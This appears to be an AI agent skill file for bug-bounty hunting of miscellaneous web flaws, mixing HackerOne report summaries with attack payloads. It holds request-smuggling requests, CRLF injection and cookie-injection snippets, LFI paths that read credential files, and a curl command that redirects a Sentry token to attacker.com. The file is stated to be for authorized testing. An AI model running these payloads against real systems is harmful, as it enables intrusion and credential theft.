---
name: bbhunt-other
description: "Use only when no other class fits: novel primitives, protocol oddities, email/SMS abuse, or multi-class issues without a clear root cause. Unified from 4 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Miscellaneous Vulnerabilities — unified methodology

> **Methodology skill.** Merged from 4 upstream skills across cbh, h1skills, hunting and grounded in 15,259 disclosed HackerOne reports. Payloads, wordlists and supporting data are in `references/`.

## Corpus signal — 1226 valid reports (246 paid / 20%)

Every disclosed report is valid; payment is an impact signal, not a validity test. Full technique frequencies, case studies and approach patterns: `references/evidence.md`.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| public source-code / repo review | 189 |
| encoding / double-encode / null byte | 146 |
| admin / privileged-role context | 144 |
| internal service / port / container | 139 |
| file upload / filename / extension | 107 |
| header injection (Host / X-Forwarded / etc.) | 101 |
| Content-Type / body-format switch | 94 |
| HTTP method / verb tampering | 91 |
| subdomain / DNS / cert-transparency recon | 88 |
| cache / CDN / unkeyed header | 86 |
| WAF / sanitizer / filter bypass | 65 |
| DOM / HTML source inspection | 63 |

## Corpus-backed method (this class)

1. Describe the primitive precisely: what the server does, with what input, under which identity.
2. Re-check the router — most 'other' findings are actually authz, logic, or info-disclosure with a clearer playbook.
3. Find at least one precedent in the corpus using symptom keywords; use it to name the root cause.
4. Apply the generic validation gate before spending more time.
5. If a real class emerges, switch to that skill and restart from its step 1.

### Signals

- Behaviour that does not map to a standard class
- Cross-layer trust issues (email, SMS, queue, third-party service)
- A defect best described by its consequence rather than its mechanism

### Kill criteria

- No reproducible primitive.
- Classified 'other' only to avoid doing the work of root-cause analysis.

### Escalation chains



### Veteran tip

Treat 'other' as a temporary queue, not a destination.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method
### Step-by-Step Hunting Methodology

1. **Map all role/permission boundaries** — enumerate every role level (owner → admin → staff → guest → removed) and document what each role *should* see

   **Marker Discipline:** when probing role boundaries by injecting unique tokens / identifiers into per-role test data, markers MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `attacker`, `evil`, `admin`, `AAAA`. Good markers: `cpmark987abc`, `x4hd2k9pq`. Before claiming any reflection, search the baseline (no-marker) response for the marker — if it appears naturally, change your marker.

   **Body-Diff Rule:** a privilege-bypass claim requires response BODY differential, not status-code-only. 200 OK with byte-identical body to baseline is NOT a bypass. Always diff bodies side-by-side before claiming bypass. Status-code-only claims are the most common rejected-as-N/A category on bug-bounty platforms.

2. **Test invitation flows end-to-end** — accept invitations without completing verification steps; modify invitation tokens; test whether accepting an invitation as a different user grants access

3. **Test post-removal access** — add a user to a resource, remove them, then test if their session/token still grants access (especially after company/org removal)

4. **Fuzz token scope enforcement** — create PATs/tokens with minimal or no scopes, then call API endpoints that *should* require elevated scopes

5. **Test cross-tenant resource access** — as Tenant A, attempt to read/write Tenant B's resources by manipulating IDs, paths, or headers

6. **Probe internal/undocumented API endpoints** — look for LFS endpoints, internal GraphQL operations, pre-receive hook environments, webhook delivery logs

7. **Check SAML/SSO logic** — test signature verification bypass by stripping signatures, modifying NameID, replaying assertions, or manipulating XML namespace

8. **Audit configuration fields for SSRF/token exfiltration** — any URL field in admin settings (Sentry DSN, webhook URL, proxy URL) is a potential SSRF or credential leak

9. **Test password reset and email verification flows** — skip email verification steps; test whether reset tokens are scoped to a single user; test token reuse

10. **Check HTTP header injection points** — any user-controlled input passed into response headers via Ruby/Rack middleware; test CRLF sequences

11. **Verify DNS/subdomain hygiene** — enumerate subdomains, check for dangling CNAME records, verify SPF/DMARC/DKIM records

12. **Test package registry proxy configurations** — look for dependency confusion via forwarded requests to public registries (PyPI, npm, RubyGems)

---

### A. Discovery checklist — concrete places, params, headers, flows to look

- `misc` is the routing skill for **cross-cutting and novel primitives** that don't fit a single class. First check whether the finding belongs in a dedicated skill (XSS, SSRF, CSRF, cache, race); if it spans two or more parsers/layers or uses a brand-new technique, it belongs here.
- Track the annual research frontier: PortSwigger's **Top 10 Web Hacking Techniques of 2025** (published Feb 2026) is the best single signal for what "misc" findings are currently paid and novel. 2025's winners: parser differentials, HTTP/2 CONNECT abuse, XS-Leaks (redirect-host and ETag-length), internal Next.js cache poisoning, SOAPwn (.NET WSDL/proxy RCE), Unicode normalization, blind SSRF via redirect loops, ORM leaks, and error-based SSTI. The meta-trend: **side channels as a core exploitation primitive**.
- **Parser differentials (#10)**: anywhere two components parse the same input (proxy vs origin, WAF vs app, browser vs server, request vs response) is a misc goldmine. Compare how each handles URL encoding, case, duplicate headers, null bytes, Unicode normalization, path normalization, and content-type.
- **Unicode normalization (#4 / cookie chaos)**: fuzz identifiers, filenames, cookie names, email local-parts, and usernames with NFKC-sensitive characters (fullwidth forms, U+2000 whitespace, U+0085 NEL, U+00A0 NBSP, Kelvin sign, Turkish dotted I). Look for a value that passes one layer's filter and normalizes into a protected value at another.
- **Cookie-prefix bypass surface** (PortSwigger "Cookie Chaos", Sept 2025): a cookie starting with a Unicode whitespace char (e.g. `\u2000__Host-name`) is seen by the browser as *unprefixed* (so settable from a subdomain/insecure origin) but Django/ASP.NET `.strip()` the char and treat it as `__Host-name`. Also test `$Version=1,__Host-name=...` legacy parsing on Java servers (Tomcat, Jetty). Check the reflected cookie value for XSS/session-fixation/CSRF-token overwrite.
- **HTTP/3 surfaces** (PortSwigger, Sept 2026): many apps now serve h3 (QUIC/UDP 443) with different middleware. Test h3-only origins via the HTTP/3 Adapter extension; probe **HTTP/3→HTTP/1 downgrade header injection** with kettled Turbo Intruder requests (`^~` = CRLF, `^s` = space, `^x02` = raw byte). Also note new h3 race modes (single-datagram, QPACK blocked streams) — route details to `race-condition`.
- **CRLF/header injection as a critical primitive** (PortSwigger "CRLF-powered desync", Aug 2026): Nginx `proxy_pass http://backend$uri` URL-decodes the path, so `GET /%20HTTP/1.1%0d%0aHost:%20x%0d%0aX:%20x` injects headers upstream. Any reflected-into-header input (path, `X-Forwarded-*`, error-message header values) is a candidate. Route exploitation to `request-smuggling` / `crlf-injection`.
- **CSP as an exfil surface, not a wall** (PortSwigger "Blind trust", Nov 2026): when HTML injection exists but CSP seems to block JS, check (1) allow-listed script hosts for JSONP/AngularJS gadgets (350+ known at cspbypass.com), (2) `form-action` — it does *not* inherit from `default-src`, and `form-action 'self'` still permits a self-posting form that leaks credentials via `Referer` → `<meta refresh>` to Collaborator, with **no JavaScript executed**.
- **Email/CSS trust boundaries** (PortSwigger "CSS: the bomb inside your inbox", 2026): webmail HTML/CSS sanitizers, hardened CSP, and HTML-filtering libraries can be bypassed for de-anonymization and account takeover using CSS alone. In scope when webmail is a target; route payload work to `xss`/`html-injection` but keep the trust-boundary analysis here.
- **ORM leaks (#2)**: search/filter/sort endpoints that let you infer hidden columns via error/behavior differences. If SQLi fuzzing is clean but filters behave oddly, test for ORM-generated query leakage (blind data extraction through boolean/timing differences on fields not in the response).
- **Blind SSRF made visible (#3)**: redirect loops can turn a blind SSRF into an observable signal. Route the primitive to `ssrf` but keep the "make blind visible" trick in your misc toolkit.
- **HTTP/2 CONNECT (#9)**: where CONNECT support is spreading, test whether an h2 proxy allows arbitrary CONNECT targets — this becomes internal port scanning / SSRF through the front-end. Route exploitation to `ssrf` but keep the protocol-level discovery here.
- **CSP allow-list gadget sources**: when reviewing a policy, resolve the effective `script-src-elem`/`script-src`/`default-src` chain and check each host (including `*.` wildcards) against a gadget catalog. A single JSONP endpoint on an allowed CDN turns a "blocked" HTML injection into script execution.
- **ORM/filter inference**: on search endpoints, compare results/timing when filtering on fields absent from the response (`createdAt`, `role`, `deleted`, `passwordHash`). Consistent differences are a data-extraction oracle even without SQLi syntax.
- **Error-based SSTI detection** (#1 of 2025): polyglot probes and error-based techniques can expose blind template injection where classic `{{7*7}}` is filtered. Route payload work to `ssti`; keep the "errors are an oracle" principle in your misc toolkit.

### Web-Research Methodology Additions (2026)

> Fresh-source pass: PortSwigger's Black Hat/DEF CON 2025 "HTTP/1.1 must die" research, Cloudflare Pingora CVE-2025-4366, Akamai CVE-2025-32094, Bugcrowd TE.0, and 2025-2026 emerging-vector writeups. This skill is a discovery index — these are the 2025-2026 classes most likely to arrive as "doesn't fit anywhere," each with the closest class skill to route to.

### A. Discovery checklist — concrete surfaces, inputs, configs to look for

1. **The HTTP desync family is the biggest source of "new" classes.** Evolution timeline from PortSwigger (Aug 2025): CL.TE/TE.CL (2019) → H2.CL/H2.TE (2021) → CL.0 / H2.0 / client-side desync (2022) → **TE.0** (2024, dechunking) → **TE.TE chunk extensions** (2025) → **0.CL** (2025) → **Expect-based** (2025). There are now four length interpretations in play: `CL` (Content-Length), `TE` (Transfer-Encoding), `0` (implicit zero), `H2` (HTTP/2's built-in length). HTTP/2 *downgrading* at the front-end introduces the fourth interpretation and is worse than end-to-end HTTP/1.1.
2. **Real 2025 CDN incidents to model:**
   - **Cloudflare Pingora CVE-2025-4366** — HTTP/1.1 parsing bug when caching enabled: on a cache hit the body-consumption logic was skipped, leaving unread body bytes that could be formed into a smuggled request. Exposed ~24,000,000 sites; $7,000 bounty.
   - **Akamai CVE-2025-32094** — Expect-based CL.0; 74 separate bounties totaling **$221,000**, plus $9,000 to the researcher; 65 days to fully resolve.
   - **Netlify** — CL.0 response-queue poisoning streaming other tenants' responses; **T-Mobile** 0.CL via vanilla Expect ($12,000); **GitLab** obfuscated `Expect: y 100-continue` 0.CL — 27,000 requests to capture another user's bug-bounty report video ($7,000); **LastPass** `auth.lastpass.com` CL.0 via leading-space Expect ($5,000). One research run exceeded **$350,000** in bounties.
   - **TE.0 via GCP Load Balancer** (Bugcrowd 2024) — affected thousands of Google Cloud sites including Identity-Aware Proxy; $8,500.
3. **Other 2025-2026 stragglers worth a grep:** Zimbra **CVE-2025-68645** LFI via `/h/rest?f=../../...` (CISA KEV Jan 2026 → route to `path-traversal`); elixir-mint HTTP request splitting; vishing + adversary-in-the-middle (AiTM) SSO compromise (ShinyHunters, Jan 2026 → route to `auth-bypass`/`account-takeover`); zero-click media-download chains in messaging apps (Project Zero, Jan 2026 → `memory-corruption`).
4. **Tooling to have ready:** **HTTP Request Smuggler v3.0** (Burp extension) for parser-discrepancy detection, `smuggler.py` for spray-and-pray, `http-garden` for differential HTTP server/proxy fuzzing, and Turbo Intruder with `0cl-find-offset.py` for injected-header-length discovery.
5. **Classification discipline (this skill's core job).** Write one line of root cause, then route: parser desync → `request-smuggling`; cache-served poison → `web-cache`; LLM output/tool abuse → `llm-ai`; auth state machine → `auth-bypass`; money mutation → `fintech-graphql`; native parser crash → `memory-corruption`. If none fits, keep it here WITH a reproducible PoC.### Signals and surfaces
### Crown Jewel Targets

**Why this vuln class pays:**
MISC vulnerabilities span access control failures, information disclosure, session/auth logic bugs, and misconfiguration — the categories that consistently produce the highest payouts because they map directly to business impact: data exposure, account takeover, privilege escalation, and infrastructure compromise.

**Highest-value targets:**
- **SaaS platforms with role hierarchies** (Shopify, GitHub, GitLab) — any boundary between owner/admin/staff/guest is a privilege escalation surface
- **Identity/auth flows** — invitation links, password reset, SAML SSO, OAuth token scopes
- **Multi-tenant systems** — one tenant touching another tenant's data
- **Internal APIs** — LFS endpoints, pre-receive hooks, internal GraphQL/REST that assume caller is trusted
- **Domain/DNS management features** — transfer controls, subdomain delegation
- **Token/credential management** — PAT scopes, deploy keys, API tokens stored in config fields

**Asset types that pay most:**
- Core product APIs (not marketing subdomains)
- Enterprise/self-hosted editions (GitHub Enterprise, GitLab EE)
- Partner/collaborator invitation systems
- OAuth app integrations and webhook endpoints

---

### Attack Surface Signals

**URL patterns to watch:**
```
/admin/*/transfer
/invitations/*
/partners/*/accept
/api/v*/repos/*/lfs/*
/-/settings/integrations/sentry
/api/v*/user/installations
/hooks/pre-receive/*
/reset-password?token=
/auth/saml/callback
/api/v*/packages/pypi/*
```

**Response header signals:**
```
X-Request-Id (pitchfork/Rack — check for header injection)
X-Shopify-Shop-Api-Call-Limit
X-GitLab-*
```

**JS patterns revealing internal surfaces:**
```javascript
// Look for hardcoded internal API paths
fetch('/internal/api/
graphql { installations(
"scope": [], // empty scopes on tokens
"permissions": {"contents": "read"} // minimal scope PATs
```

**Tech stack signals:**
- Ruby/Rack middleware (CRLF injection risk in `pitchfork`)
- SAML SSO enabled on enterprise instances
- PyPI proxy/mirror configurations (dependency confusion)
- Sentry error tracking integration fields (SSRF/token leak vector)
- Multi-role invitation systems (partners, staff, collaborators)

---### Techniques and bypasses
### Techniques from real reports

Concrete lessons from reports outside the main classes.

- **Github access token exposure** — `#1087489` · Shopify · $50,000 · ▲1601
  > As a proof I can tell you that on the repo github.com/Shopify/shopify at commit hash `cea9c273391d` the sha512 of the README.md is…
- **WannaCrypt “Killswitch”** — `#228648` · HackerOne · $0 · ▲809
  > Original disclosure: https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html
- **Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`** — `#684092` · BlockDev Sp. Z o.o · $0 · ▲466
  > I've attached to this report a modified version of `end.t.sol` which contains a test (`test steal all collateral using flipper`) that reproduces the attack.
- **June 2022 Incident Report** — `#1622449` · HackerOne · $0 · ▲426
  > | 2022-06-22 10:30 PDT | Call with a customer requesting an investigation into reports of an intimidating and suspicious off-platform communication from an actor with the handle "rzlr" |
- **Bypass of GitLab CI runner slash fix in YAML validation** — `#409395` · GitLab · $0 · ▲363
  > The reason is that the fix in place preventing url normalization is performed by doing the YAML validation, however this could be bypassed by setting the environment variable in `https://gitlab.com/{project id}/settings/ci cd`
- **An attacker can archive and unarchive any structured scope object on HackerOne** — `#1501611` · HackerOne · $0 · ▲318
  > This can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER
- **Bypass Email Verification -- Able to Access Internal Gitlab Services that use Login with Gitlab and Perform Check on email domain** — `#565883` · GitLab · $0 · ▲249
  > - Visit `https://gitlab.com/groups/GROUP PATH/-/saml` and setup the SAML SSO as documented
- **Spring Actuator endpoints publicly available and broken authentication** — `#838635` · LY Corporation · $12,500 · ▲234
  > Due to insufficient access control, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env.
- **Github Account hijack through broken link in developer.twitter.com** — `#1031321` · X / xAI · $0 · ▲222
  > A link in https://developer.twitter.com/en/docs/twitter-api/tools-and-libraries was broken and anyone could create that account which leads to account impersonate
- **Ability To Delete User(s) Account Without User Interaction** — `#928255` · GitLab · $0 · ▲221
  > Since Gitlab doesn't verify the request with an Valid ID before triggering Right to Access/Deletion this breaches the GDPR Law(Article 15) & moreover allows an attacker to delete User Accounts without user interaction.
- **Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin** — `#389108` · Superhuman (formerly Grammarly) · $0 · ▲202
  > `gnar.setUser`/`gnar. execQueue` / `gnar. send` / `gnar. doSend` / `gnar. enqueue`
- **HackerOne making payments in USDC (Coinbase stable coin)** — `#1220747` · HackerOne · $0 · ▲201
  > This is not new, this has been requested from many of you, and also some members of our Hacker Advisory board.
- **2020-10-09 Credential Stuffing Attack** — `#1007689` · HackerOne · $0 · ▲196
  > On October 4, 2020 and October 5, 2020, an attacker launched two [credential stuffing attacks](https://owasp.org/www-community/attacks/Credential stuffing) against HackerOne.com.
- **protected Tweet settings overwritten by other settings** — `#664038` · X / xAI · $0 · ▲178
  > ==I have deleted all data (stored data and cache), so you don't need to save any cache or history!==
- **Frans Visits Vegas Announcement** — `#251747` · Frans Visits Vegas · $0 · ▲154
  > Frans Rosén, aka, “The Swedish Ninja” (Yea, I’ve always wanted to be called that, I’ll try to make it happen by force)
- **Informations disclosure - Access to some checkout informations** — `#1064869` · Shopify · $0 · ▲150
  > It came to my attention that using the CheckoutStatus query on `https://arrive-server.shopifycloud.com/graphql` it is possible to access some checkout details, specifically the query can be called with an ID value ranging from `1` up to `48908`.
- **h1-202 leaderboard photo discloses local wifi password** — `#329798` · HackerOne · $0 · ▲145
  > Local attackers could connect to the wifi and sniff any unencypted traffic, as well as DoS the network (potentially).
- **`socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension** — `#395729` · Superhuman (formerly Grammarly) · $0 · ▲140
  > `evil.com` connects to `ws://good.com` using WS = server at `good.com` is responsible for `Origin` header validation.
- **Build fetches jars over HTTP** — `#506161` · PortSwigger Web Security · $1,000 · ▲135
  > [Comcast continues to inject its own code into websites you visit](https://thenextweb.com/insights/2017/12/11/comcast-continues-to-inject-its-own-code-into-websites-you-visit/ ) (over HTTP)
- **[URGENT] Opportunity to publish tweets on any twitters account** — `#208978` · X / xAI · $0 · ▲119
  > Write-up of the vulnerability here: https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3
- **HackerOne Code sends live password-reset tokens to Segment in automatic page events** — `#4000185` · HackerOne · $200 · ▲115
  > The token appears in `context.page.search`, `context.page.url`, `properties.search`, and `properties.url`.
- **Lack of Rate Limiting on Account Creation Endpoint** — `#2915502` · XVIDEOS · $200 · ▲110
  > Set the ██████████ type to numbers and range it from `0` to `1000`.
- **SMAP bypass** — `#1048322` · PlayStation · $0 · ▲110
  > The problem is, the fault handler `copy fault` does not clear `%RFLAGS.AC`, meaning that it remains set after `copyin()`/`copyout()` returns.
- **DLL side-loading vulnerability in Sony Music Center for PC Ver. 2.7.2 (Latest version)** — `#3355766` · Sony · $0 · ▲109
  > MITRE reference: https://attack.mitre.org/techniques/T1574/001/
- **Rate limit bypass on passport.acronis.work using X-Forwarded-For request header** — `#2627062` · Acronis · $0 · ▲106
  > in case you wanted to try to login to a victims account as attacker, such as `ab@acronis.com` which I found on snov.io you can't if you aren't from bulgaria, you will be restricted due to you are not from bulgaria and you see that error `ERR-B258C8`
- **[Bypass #645264] Report title disclosure despite the program settings for email notification is set to "No Content"** — `#669438` · HackerOne · $500 · ▲104
  > I have found that email invitation for a collaborator (bounty splitting) still disclosing the Report title in email when the notification comes from `Manage Collaborator` invitation.
- **Use Github pack with Coda employee github account (search code of Coda's private repositories)** — `#676581` · Superhuman (formerly Grammarly) · $0 · ▲104
  > If you look at the requests in Burp, you will see a request to https://coda.io/embed/igvicDMruo?viewMode=gallery&disconnected=true that is loaded in an `<iframe ` (it is the document you see when you load the template).
- **HTML Injection in LinkedIn Premium Support Chat** — `#3079966` · LinkedIn · $0 · ▲102
  > `https://www.linkedin.com/premium/survey/?destRedirectURL=https%3A%2F%2Fwww.linkedin.com%2Fsearch%2Fresults%2Fall%2F%3Fkeywords%3Dtest%2520card%2520bugbounty%26origin%3DGLOBAL SEARCH HEADER%26sid%3Dn%253Bl`
- **Lack of URL normalization renders Blocked-Previews feature ineffectual** — `#1102764` · Slack · $1,000 · ▲100
  > with [Microsoft Outlook](https://hackerone.com/redirect?url=https%3A%2F%2Fslackhq.com%2Fincrease-everyday-productivity-with-office-365-apps-for-slack)).
- **Malformed save files (.sav) allow to write files with arbitrary extensions and content in GoldSrc-based games.** — `#458842` · Valve · $1,500 · ▲99
  > - sets the directory against which the engine will try to load the client library 'cl dlls/client.dll' into memory when restarted;

### Payload fragments observed

| Seen | Fragment |
|---:|---|
| 8× | `curl_multi_socket_action()` |
| 7× | `%RFLAGS.AC` |
| 7× | `jobert@mydocz.cosmic` |
| 6× | `<a>` |
| 6× | `free()` |
| 6× | `javascript:` |
| 6× | `curl_multi_perform()` |
| 5× | `multi->process` |
| 5× | `--url @file` |
| 4× | `ExternalMemoryAccounter::Increase()` |
| 4× | `__%48ost-` |
| 4× | `wcurl -- "$url` |
| 4× | `parse_netscape()` |
| 4× | `multi_run_dirty()` |
| 4× | `smbc->share` |
| 4× | `swrite()` |
| 4× | `digest->origin` |
| 3× | `copyin()` |
| 3× | `<iframe>` |
| 3× | `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$` |

### Common Root Causes

1. **Soft deletes without permission invalidation** — removing a user from an org marks them as removed but doesn't revoke active sessions or cached permission checks; subsequent API calls still pass old auth context

2. **Invitation acceptance without verification gate** — developers implement invitation flow optimistically (assume user who received email is legitimate) and skip re-verification when token is consumed by a different session

3. **Token scope checked at issuance, not at use** — PAT/OAuth scopes validated when token is created but individual API endpoint handlers don't re-check scope, trusting middleware that may have a gap

4. **Role-based access control checked at UI layer only** — frontend hides buttons for restricted roles but backend API endpoints don't enforce the same restriction; direct API calls bypass UI gating

5. **SAML XML parsing quirks** — signature covers only part of the document; XML canonicalization differences allow unsigned content to pass verification; namespace prefix attacks

6. **Config/URL fields trusted as internal** — integration URL fields (Sentry, webhooks) assumed to be set only by trusted admins; maintainer-level roles can modify them to exfiltrate tokens

7. **Ruby header injection via string interpolation** — developer builds HTTP response headers by string concatenation without sanitizing newlines; Rack 3 behavioral changes exposed previously-hidden bugs

8. **Proxy/mirror configs forwarding all requests upstream** — package registries configured to fall back to public registries without restricting which packages are internal-only, enabling dependency confusion

9. **Pre-receive hook environments exposing privileged context** — hook scripts run with access to internal environment variables, git internals, or SSH keys that shouldn't be user-accessible

10. **Multi-device session design conflated with session fixation** — engineers implement "remember me across devices" by issuing non-expiring tokens, treating it as a feature while creating persistent access risk

11. **Server-policy responses mistaken for state-based oracles** — when many different path types return the SAME response shape, suspect a server-side blocklist/policy filter, NOT a real file-existence / user-existence / resource-existence oracle. Engineers add blanket filters (e.g., "block any path ending in `.config`/`.ashx`/`.asmx`/`.svc`") that return the same error regardless of whether the underlying file exists. Don't infer "file exists" from "blocked"; verify with an independent signal (Collaborator callback, response-time differential at scale, or out-of-band confirmation). Lesson: SharePoint's `download.aspx?SourceUrl=` returned `"blocked from this Web site by the server administrators"` for `.ashx`/`.asmx`/`.svc`/`.config` extensions regardless of whether the underlying file existed — looked like a file-existence oracle, was actually the extension blocklist. Treating it as the former produced a list of "discovered custom customer-branded endpoints" that didn't actually exist.

---

### Operator-level pattern

When you confirm a misc primitive at A, **immediately** ask: what state-machine, cache layer, sibling endpoint, or auth-state-skew can amplify it? The first primitive is the entry pass. The chain is the deliverable. Every Workstream-A skill citation in this bundle pairs with at least one chain shape above:
- `auth-bypass` — Chains 2, 4, 5
- `web-cache` — Chain 3
- `saml` — Chain 4
- `subdomain-takeover` — Chain 6
- `account-takeover` — Chains 1, 2, 5, 6 (all terminal-impact paths)

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Parser-differential mini-lab**: send the same logical request through two representations and compare: `/foo%2e%2e/bar` vs `/foo../bar`; duplicate `Content-Length`/`Transfer-Encoding`; `Host: a` + `X-Forwarded-Host: b`; `;` vs `&` parameter delimiters (parameter cloaking); mixed case in header names; overlong UTF-8 sequences. A difference in routing/cache/authz outcome is the finding.
- **Cookie-prefix injection PoC**:
  ```javascript
  document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
  ```
  On the wire: `Cookie: __Host-name=real; â€€__Host-name=injected`. Frameworks that keep the last duplicate cookie now see the attacker value. Classic Java legacy variant: `document.cookie = "$Version=1,__Host-name=injected; Path=/; Domain=.example.com;"`.
- **CSP form-action credential theft** (no JS): inject a form with no `action` (submits back to the vulnerable page) whose input is named after the vulnerable parameter and contains a second-stage payload; on reflection, use `<img>`/`<meta http-equiv=refresh>` so the full URL with credentials goes into `Referer` and navigates to Collaborator. Verify the effective CSP fallback chain (`script-src-elem` → `script-src` → `default-src`); `strict-dynamic` changes the verdict for host gadgets.
- **CRLF → request splitting probe**: `GET /%0d%0aHost:%20x%0d%0a%0d%0a HTTP/1.1` and variants; a `400` on an injected invalid `Content-Length` indicates the header reached upstream. Then follow the CRLF-powered desync methodology to confirm cross-user impact (response queue poisoning) rather than stopping at "header reflected."
- **HTTP/3 downgrade injection**: `GET / HTTP/1.1\nFoo: bar^~Transfer-Encoding:^schunked` queued with `kettled=True` — the escape bytes survive translation into the downgraded HTTP/1 request. Confirm with a controlled desync detector, not just a weird status code.
- **Shared-parser confusion** (PortSwigger's AI-driven discovery): a parser that shares code between *responses* and *requests* will misapply response rules to requests — e.g. `Content-Type: multipart/byteranges` or processing `Set-Cookie` in requests. Probe request-side handling of response-only headers/features on servers that use shared HTTP libraries.
- **Range cache poisoning**: `Range: bytes=5-10, 1-2` returning `200` + `multipart/byteranges` may be cacheable; combine with front-end reassembly or context-aware escaping to inject HTML into a cached response. Test only with a cache buster and bounded requests.
- **XS-Leak patterns**: cross-origin redirect-hostname leakage via Chrome connection-pool prioritization; cross-site ETag-length leakage via chained edge cases. These need a victim action and a statistical oracle — treat as informational unless you can leak a specific sensitive value (route to `xs-leaks` reasoning; this skill provides the "side-channel is the primitive" mindset).
- **Shadow-function abuse (BLA10)**: enumerate old API versions, `/debug`, `/test`, internal GraphQL mutations, `.git`/source maps/artifacts; then call the hidden function as a normal user. This overlaps `info-disclosure` but the finding is the *callable hidden function*, not the leak itself.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

1. **Detect parser discrepancies instead of brittle payloads.** Send a partially masked Host header (`Xost: target`) and look for a response that cannot be produced by a normal Host, an omitted Host, or an arbitrary masked header:
   - **V-H** = masked header visible to front-end, hidden from back-end.
   - **H-V** = hidden from front-end, visible to back-end.
   Only the *difference* in responses matters — specific status codes are irrelevant and often misleading.
2. **V-H → CL.0 desync.** Hide Content-Length from the back-end:
   ```
   GET /style.css HTTP/1.1
   Host: target
   Foo: bar
    Content-Length: 23

   GET /404 HTTP/1.1
   X: y
   ```
   If the front-end rejects GET requests with a body, switch the method to **OPTIONS**. CL.0 is preferred over TE.CL because WAFs rarely block it.
3. **H-V on IIS behind AWS ALB.** Classic CL.TE is blocked by AWS "Desync Guardian"; Thomas Stacey bypassed it with **H2.TE**. Even with that fixed, header smuggling still enables IP spoofing and sometimes full auth bypass. Self-hosted fix: set `routing.http.drop_invalid_header_fields.enabled` and `routing.http.desync_mitigation_mode = strictest`. Lesson: adopting a cloud proxy imports another company's technical debt into your threat model.
4. **0.CL deadlock → early-response gadget.** 0.CL normally deadlocks (front-end buffers the payload, back-end waits for the body). Escape requires a gadget that makes the back-end respond before the body arrives: nginx static files, server-level redirects, or the Windows reserved-name quirk — requesting `/con` (CON/PRN/AUX/NUL/COM1…) makes IIS respond early and leave the connection open. No viable gadget was found for Apache. PortSwigger reports that suspicious "400 Bad Request" responses ("Mystery 400" in Request Smuggler) were likely 0.CL all along.
5. **0.CL → CL.0 double-desync.** Three stages: (1) a 0.CL request poisons the connection, (2) the poisoned connection weaponizes a second request into CL.0, (3) the malicious prefix poisons the victim's request. Use `0cl-find-offset.py` to learn the front-end's injected-header length — but those headers often contain the client IP, which breaks replication for triagers. Reliability trick: most servers *append* headers at the end, so start the smuggled request before them. Then apply standard CL.0 techniques (e.g. the HEAD technique to serve malicious JavaScript).
6. **Expect-based desync.** Try `Expect: 100-continue`, obfuscated `Expect: y 100-continue`, and leading-space/newline variants (`Expect:\n 100-continue`). Effects seen: 0.CL, CL.0, HEAD responses mis-parsed → upstream 504, memory fragments disclosed in a second `100 Continue` block, secret keys leaked, and **response header-removal bypass** (Expect creates a second header block, exposing internal headers like Netlify's `X-Bb-Account-Id`, `X-Nf-Cache-Key`; Netlify called this "provided by design").
7. **Response Queue Poisoning (RQP)** for low-traffic targets: queue two requests after the poison and harvest the shifted responses. Inherent race condition — GitLab needed 27,000 attempts. Prefer a redirect/XSS/desync gadget when available.
8. **Zimbra LFI shape (route to `path-traversal`):** `GET /h/rest?f=../../conf/localconfig.xml` → database credentials; `/etc/passwd`, `/proc/self/environ`, `nginx.conf`, `keystore.jks`.

### Payload & Detection Patterns

**CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**
```bash
# Test CRLF in header values
curl -v "https://target.com/path" \
  -H $'X-Custom: value\r\nInjected-Header: evil'

# URL-encoded variant
curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"

# Test in pitchfork/Rack apps — inject via query param reflected in Location header
curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

**Privilege escalation via invitation bypass:**
```bash
# Accept invitation without email verification
curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
  -H "Cookie: session=UNVERIFIED_SESSION" \
  -d '{"role":"admin"}'

# Test invitation token for another user
curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION"
```

**Token scope bypass (GitHub/GitLab PAT):**
```bash
# Call privileged endpoint with minimal-scope token
curl -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \
  "https://api.github.com/repos/org/private-repo/issues"

# Test suspended installation access
curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
  "https://api.github.com/app/installations/SUSPENDED_INSTALL_ID"
```

**SSRF via config URL fields (Sentry integration):**
```bash
# Change Sentry URL to internal listener
curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
  -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \
  -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'
```

**ReDoS detection:**
```bash
# Test Ruby URI parser
ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'

# Test IPAddr
ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'

# Timing-based detection
time curl "https://target.com/search?q=aaaa" # baseline
time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
```

**Grep patterns for source recon:**
```bash
# Find SAML signature verification
grep -r "validate_signature\|verify_signature\|skip.*signature" --include="*.rb"

# Find hardcoded or weak scope checks
grep -r "without_scope\|any_scope\|scope.*bypass" --include="*.rb"

# Find invitation acceptance without verification
grep -r "accept.*invitation\|invitation.*accept" --include="*.rb" | grep -v "verified\|confirmed"

# Find internal API routes
